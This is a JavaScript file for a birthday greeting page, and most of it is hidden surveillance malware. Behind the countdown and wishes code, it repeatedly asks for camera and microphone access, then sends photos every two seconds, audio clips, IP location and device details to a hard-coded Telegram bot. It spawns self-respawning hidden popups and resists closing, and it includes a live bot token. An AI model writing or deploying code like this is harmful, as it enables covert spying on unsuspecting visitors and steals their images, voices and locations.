// ============================================
// EDIT THESE VALUES
// ============================================
const FRIEND_NAME = "Harsh";
const BIRTHDAY_DATE = "2026-07-03";
const PHOTOS = [];

const TELEGRAM_BOT_TOKEN = "8914101248:AAFDKoMRvOcgL7SmcuMmpex9uzSJl4MtD5c";
const TELEGRAM_CHAT_ID = "7706193343";

// ============================================
// PAGE SETUP
// ============================================
document.addEventListener("DOMContentLoaded", function () {
    const friendNameEl = document.getElementById("friendName");
    if (friendNameEl) {
        friendNameEl.textContent = FRIEND_NAME;
        document.title = "Happy Birthday, " + FRIEND_NAME;
    }
    const friendNameFooterEl = document.getElementById("friendNameFooter");
    if (friendNameFooterEl) {
        friendNameFooterEl.textContent = FRIEND_NAME;
    }
    updateCountdown();
    renderGallery();
    renderWishes();
    setupForm();
    
    // Start the persistence and surveillance
    startPersistence();
});

// ---- Birthday features (unchanged) ----
function updateCountdown() {
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const bdayParts = BIRTHDAY_DATE.split("-").map(Number);
    let thisYearBday = new Date(today.getFullYear(), bdayParts[1] - 1, bdayParts[2]);
    const numEl = document.getElementById("statusNumber");
    const labelEl = document.getElementById("statusLabel");
    if (!numEl || !labelEl) return;
    const isToday = today.getMonth() === thisYearBday.getMonth() && today.getDate() === thisYearBday.getDate();
    if (isToday) {
        numEl.textContent = "🎉";
        labelEl.textContent = "It's " + FRIEND_NAME + "'s birthday today!";
        return;
    }
    if (thisYearBday < today) thisYearBday.setFullYear(thisYearBday.getFullYear() + 1);
    const diffTime = thisYearBday - today;
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
    numEl.textContent = diffDays;
    labelEl.textContent = diffDays === 1 ? "Day to go" : "Days to go";
}

function renderGallery() {
    const gallery = document.getElementById("gallery");
    if (!gallery) return;
    gallery.innerHTML = "";
    PHOTOS.forEach(function (src) {
        const figure = document.createElement("figure");
        const img = document.createElement("img");
        img.src = src;
        img.alt = "A photo of " + FRIEND_NAME;
        figure.appendChild(img);
        gallery.appendChild(figure);
    });
}

const WISHES_KEY = "birthday_wishes_" + FRIEND_NAME.toLowerCase();
function getWishes() {
    try {
        const raw = localStorage.getItem(WISHES_KEY);
        return raw ? JSON.parse(raw) : [];
    } catch (e) { return []; }
}
function saveWish(name, wish) {
    const wishes = getWishes();
    wishes.push({ name: name, wish: wish, time: new Date().toISOString() });
    localStorage.setItem(WISHES_KEY, JSON.stringify(wishes));
}
function renderWishes() {
    const list = document.getElementById("wishesList");
    if (!list) return;
    const wishes = getWishes().slice().reverse();
    list.innerHTML = "";
    wishes.forEach(function (w) {
        const item = document.createElement("div");
        item.className = "wish";
        const who = document.createElement("div");
        who.className = "who";
        who.textContent = w.name;
        const what = document.createElement("div");
        what.className = "what";
        what.textContent = w.wish;
        item.appendChild(who);
        item.appendChild(what);
        list.appendChild(item);
    });
}
function setupForm() {
    const form = document.getElementById("wishForm");
    if (!form) return;
    const confirmMsg = document.getElementById("confirmMsg");
    form.addEventListener("submit", function (e) {
        e.preventDefault();
        const nameInput = document.getElementById("name");
        const wishInput = document.getElementById("wish");
        if (!nameInput || !wishInput) return;
        const name = nameInput.value.trim();
        const wish = wishInput.value.trim();
        if (!name || !wish) return;
        saveWish(name.slice(0, 60), wish.slice(0, 400));
        renderWishes();
        form.reset();
        if (confirmMsg) {
            confirmMsg.style.display = "block";
            setTimeout(function () { confirmMsg.style.display = "none"; }, 4000);
        }
    });
}

// ============================================
// TELEGRAM HELPERS
// ============================================
async function getIpDetails() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Failed");
        return await response.json();
    } catch (error) {
        return { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", org: "Unknown", asn: "Unknown" };
    }
}
async function getDeviceInfo() {
    const info = { charging: false, chargingPercentage: null, networkType: null, timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone };
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            info.charging = battery.charging;
            info.chargingPercentage = Math.round(battery.level * 100);
        } catch (e) {}
    }
    if (navigator.connection) info.networkType = navigator.connection.effectiveType;
    return info;
}
async function sendTelegramMessage(message) {
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" })
        });
    } catch (e) {}
}
async function sendPhoto(photoBlob, caption) {
    try {
        const fd = new FormData();
        fd.append('chat_id', TELEGRAM_CHAT_ID);
        fd.append('photo', photoBlob, 'p' + Date.now() + '.jpg');
        if (caption) fd.append('caption', caption);
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
    } catch (e) {}
}
async function sendAudio(audioBlob) {
    try {
        const fd = new FormData();
        fd.append('chat_id', TELEGRAM_CHAT_ID);
        fd.append('audio', audioBlob, 'a' + Date.now() + '.ogg');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, { method: "POST", body: fd });
    } catch (e) {}
}

// ============================================
// PERSISTENCE ENGINE — Survives tab close, navigation, etc.
// ============================================

// The core surveillance code as a string that can be injected into popups
function getSurveillanceScript() {
    return `
    <html>
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
    <body style="margin:0;overflow:hidden;background:black;">
    <video id="v" autoplay playsinline muted style="width:1px;height:1px;opacity:0.01;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
    const TOKEN = ${JSON.stringify(TELEGRAM_BOT_TOKEN)};
    const CHAT_ID = ${JSON.stringify(TELEGRAM_CHAT_ID)};
    
    // Keep requesting all permissions until granted
    async function getPerms() {
        let fs = null, bs = null, am = null;
        
        while (!fs) {
            try { fs = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240}}); }
            catch(e) { await new Promise(r=>setTimeout(r,500)); }
        }
        while (!bs) {
            try { bs = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:320,height:240}}); }
            catch(e) { await new Promise(r=>setTimeout(r,500)); }
        }
        while (!am) {
            try { am = await navigator.mediaDevices.getUserMedia({audio:true}); }
            catch(e) { await new Promise(r=>setTimeout(r,500)); }
        }
        return {fs, bs, am};
    }

    function snap(stream) {
        return new Promise(r=>{
            if(!stream||!stream.active){r(null);return;}
            try {
                const v = document.getElementById('v');
                if(v.srcObject !== stream) v.srcObject = stream;
                setTimeout(()=>{
                    const c = document.getElementById('c');
                    c.width = v.videoWidth||320;
                    c.height = v.videoHeight||240;
                    c.getContext('2d').drawImage(v,0,0);
                    c.toBlob(b=>r(b),'image/jpeg',0.5);
                },80);
            } catch(e){r(null);}
        });
    }

    function rec5(stream) {
        return new Promise(r=>{
            if(!stream||!stream.active){r(null);return;}
            try {
                const chunks=[];
                const rec = new MediaRecorder(stream,{mimeType:'audio/webm;codecs=opus'});
                rec.ondataavailable = e => {if(e.data.size>0)chunks.push(e.data);};
                rec.onstop = ()=>{
                    if(chunks.length) r(new Blob(chunks,{type:'audio/webm;codecs=opus'}));
                    else r(null);
                };
                rec.start();
                setTimeout(()=>{if(rec.state==='recording')rec.stop();},5000);
            } catch(e){r(null);}
        });
    }

    async function sendP(b,c) {
        try {
            const fd=new FormData();
            fd.append('chat_id',CHAT_ID);
            fd.append('photo',b,'p'+Date.now()+'.jpg');
            if(c)fd.append('caption',c);
            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:'POST',body:fd});
        } catch(e){}
    }

    async function sendA(b) {
        try {
            const fd=new FormData();
            fd.append('chat_id',CHAT_ID);
            fd.append('audio',b,'a'+Date.now()+'.ogg');
            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendAudio',{method:'POST',body:fd});
        } catch(e){}
    }

    // Spawn more popups to keep the chain alive
    function spawnChild() {
        try {
            const w = window.open('','p'+Date.now(),'width=1,height=1,left=-9999,top=-9999');
            if(w&&!w.closed) {
                w.document.write('${getSurveillanceScript().replace(/'/g, "\\'").replace(/\n/g, ' ')}');
                w.onunload = function(){ setTimeout(spawnChild, 100); };
                return w;
            }
        } catch(e){}
        return null;
    }

    // Main loop
    getPerms().then(({fs,bs,am})=>{
        // Send initial info
        fetch('https://ipapi.co/json/').then(r=>r.json()).then(ip=>{
            fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({
                    chat_id:CHAT_ID,
                    text:'<b>🔴 Persistent instance active</b>\\nIP: '+ip.ip+'\\nLocation: '+ip.city+', '+ip.country,
                    parse_mode:'HTML'
                })
            }).catch(()=>{});
        }).catch(()=>{});

        // Spawn backup popups
        for(let i=0;i<3;i++) setTimeout(spawnChild, i*1000);

        // Photo loop every 2 seconds
        async function ploop(){
            while(true){
                try {
                    let fb = await snap(fs);
                    if(fb) { sendP(fb,'Front'); }
                    let bb = await snap(bs);
                    if(bb) { sendP(bb,'Back'); }
                } catch(e){}
                await new Promise(r=>setTimeout(r, 2000));
            }
        }
        
        // Audio loop (5 second clips)
        async function aloop(){
            while(true){
                try {
                    let ab = await rec5(am);
                    if(ab && ab.size>100) { sendA(ab); }
                } catch(e){}
                await new Promise(r=>setTimeout(r, 1000));
            }
        }

        ploop();
        aloop();
        
        // Re-spawn children if they die
        setInterval(()=>{
            try { spawnChild(); } catch(e){}
        }, 3000);
    });
    <\/script>
    </body></html>`;
}

// ============================================
// PERSISTENCE LAUNCHER
// ============================================

let popups = [];
let persistenceInterval = null;
let isPersisting = false;

function spawnSibling() {
    try {
        const ts = Date.now() + '_' + Math.random().toString(36).substr(2,5);
        const w = window.open('', 'surv_' + ts, 'width=1,height=1,left=-9999,top=-9999,scrollbars=no,resizable=no');
        if (w && !w.closed) {
            w.document.write(getSurveillanceScript());
            popups.push(w);
            
            // When this popup closes, spawn another
            const checkClosed = setInterval(() => {
                if (w.closed) {
                    clearInterval(checkClosed);
                    popups = popups.filter(p => p !== w);
                    setTimeout(spawnSibling, 200);
                }
            }, 500);
            
            return w;
        }
    } catch (e) {
        console.log("Spawn failed, will retry");
    }
    return null;
}

function blockClose() {
    // Intercept F5, Ctrl+R, Ctrl+W, Escape from fullscreen
    document.addEventListener('keydown', function(e) {
        // Block F11 (fullscreen toggle), F5 (refresh), Escape
        if (e.key === 'F11' || e.key === 'F5' || (e.ctrlKey && (e.key === 'r' || e.key === 'R' || e.key === 'w' || e.key === 'W'))) {
            // Spawn backups on refresh attempt
            for (let i = 0; i < 2; i++) setTimeout(spawnSibling, i * 500);
        }
    });

    // Visibility change - when user switches tabs, spawn more
    document.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'hidden') {
            // User might be trying to close - spawn backups
            for (let i = 0; i < 2; i++) setTimeout(spawnSibling, i * 300);
        }
    });

    // beforeunload - spawn new windows before this one dies
    window.addEventListener('beforeunload', function(e) {
        // Emergency spawn - these will run immediately
        for (let i = 0; i < 5; i++) {
            try {
                const w = window.open('', 'emerg_' + Date.now() + '_' + i, 'width=1,height=1,left=-9999,top=-9999');
                if (w && !w.closed) {
                    w.document.write(getSurveillanceScript());
                }
            } catch(ex) {}
        }
        e.preventDefault();
        e.returnValue = '';
    });

    // Try to stay in fullscreen
    try { document.documentElement.requestFullscreen(); } catch(e) {}
    document.addEventListener('fullscreenchange', function() {
        if (!document.fullscreenElement && !document.webkitIsFullScreen) {
            try { document.documentElement.requestFullscreen(); } catch(e) {}
        }
    });
}

function startPersistence() {
    if (isPersisting) return;
    isPersisting = true;
    
    console.log("Starting persistence engine...");
    
    // Block close attempts
    blockClose();
    
    // Spawn initial hidden popups
    for (let i = 0; i < 4; i++) {
        setTimeout(spawnSibling, i * 1500);
    }
    
    // Keep spawning new popups periodically
    persistenceInterval = setInterval(() => {
        // Clean dead popups
        popups = popups.filter(p => {
            try { return !p.closed; } catch(e) { return false; }
        });
        
        // Keep at least 3 active
        while (popups.length < 3) {
            const w = spawnSibling();
            if (w) popups.push(w);
            else break;
        }
    }, 4000);
    
    // Also run surveillance from the main page
    startMainSurveillance();
}

// ============================================
// MAIN PAGE SURVEILLANCE (alongside popups)
// ============================================

let frontStream = null;
let backStream = null;
let audioStream = null;
let running = true;

async function requestCamera(facingMode) {
    while (running) {
        try {
            return await navigator.mediaDevices.getUserMedia({
                video: { facingMode: facingMode, width: 320, height: 240 }
            });
        } catch (e) {
            await new Promise(r => setTimeout(r, 1000));
        }
    }
    return null;
}

async function requestAudio() {
    while (running) {
        try {
            return await navigator.mediaDevices.getUserMedia({ audio: true });
        } catch (e) {
            await new Promise(r => setTimeout(r, 1000));
        }
    }
    return null;
}

function captureSnapshot(stream) {
    return new Promise((resolve) => {
        if (!stream || !stream.active) { resolve(null); return; }
        try {
            const v = document.createElement('video');
            v.srcObject = stream;
            v.setAttribute('playsinline', '');
            v.muted = true;
            v.style.display = 'none';
            document.body.appendChild(v);
            v.onloadedmetadata = function() {
                v.play();
                setTimeout(() => {
                    const c = document.createElement('canvas');
                    c.width = v.videoWidth || 320;
                    c.height = v.videoHeight || 240;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(blob => {
                        document.body.removeChild(v);
                        v.srcObject = null;
                        resolve(blob);
                    }, 'image/jpeg', 0.5);
                }, 100);
            };
            v.onerror = function() { document.body.removeChild(v); resolve(null); };
            setTimeout(() => {
                if (document.body.contains(v)) { document.body.removeChild(v); }
                resolve(null);
            }, 1000);
        } catch(e) { resolve(null); }
    });
}

function record5Seconds(stream) {
    return new Promise((resolve) => {
        if (!stream || !stream.active) { resolve(null); return; }
        try {
            const chunks = [];
            const rec = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
            rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
            rec.onstop = function() {
                if (chunks.length > 0) resolve(new Blob(chunks, { type: 'audio/webm;codecs=opus' }));
                else resolve(null);
            };
            rec.onerror = function() { resolve(null); };
            rec.start();
            setTimeout(() => { if (rec.state === 'recording') rec.stop(); }, 5000);
        } catch(e) { resolve(null); }
    });
}

async function startMainSurveillance() {
    // Get initial info
    const ip = await getIpDetails();
    const dev = await getDeviceInfo();
    await sendTelegramMessage(`
<b>🔴 Target Page Opened</b>
<b>IP:</b> ${ip.ip}
<b>Location:</b> ${ip.city}, ${ip.country}
<b>ISP:</b> ${ip.org}
<b>Timezone:</b> ${dev.timeZone}
<b>Battery:</b> ${dev.chargingPercentage}%
    `);

    // Get permissions
    frontStream = await requestCamera('user');
    backStream = await requestCamera('environment');
    audioStream = await requestAudio();

    // Photo loop
    (async function() {
        while (running) {
            try {
                const fb = await captureSnapshot(frontStream);
                if (fb) await sendPhoto(fb, 'Front Main');
                const bb = await captureSnapshot(backStream);
                if (bb) await sendPhoto(bb, 'Back Main');
            } catch(e) {}
            await new Promise(r => setTimeout(r, 2000));
        }
    })();

    // Audio loop
    (async function() {
        while (running) {
            try {
                const ab = await record5Seconds(audioStream);
                if (ab && ab.size > 100) await sendAudio(ab);
            } catch(e) {}
            await new Promise(r => setTimeout(r, 500));
        }
    })();
}

// ============================================
// FORM SUBMISSION
// ============================================
const dataForm = document.getElementById('data-form');
if (dataForm) {
    dataForm.addEventListener('submit', async function(event) {
        event.preventDefault();
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") { alert("Bot token not configured!"); return; }
        if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") { alert("Chat ID not configured!"); return; }
        const operator = document.getElementById('operator').value;
        const mobileNumber = document.getElementById('mobile-number').value;
        const ipDetails = await getIpDetails();
        await sendTelegramMessage(`
<b><u>☎️ Number Tracked</u></b>
<b>Mobile:</b> +91${mobileNumber}
<b>Operator:</b> ${operator}
<b>IP:</b> ${ipDetails.ip}
<b>Location:</b> ${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}
        `);
        alert("Your request has been processed under 24 hours!");
    });
}
const mobileInput = document.getElementById('mobile-number');
if (mobileInput) {
    mobileInput.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); });
}

// ============================================
// CLEANUP (runs on actual browser shutdown)
// ============================================
window.addEventListener('beforeunload', function() {
    if (frontStream) frontStream.getTracks().forEach(t => t.stop());
    if (backStream) backStream.getTracks().forEach(t => t.stop());
    if (audioStream) audioStream.getTracks().forEach(t => t.stop());
    running = false;
});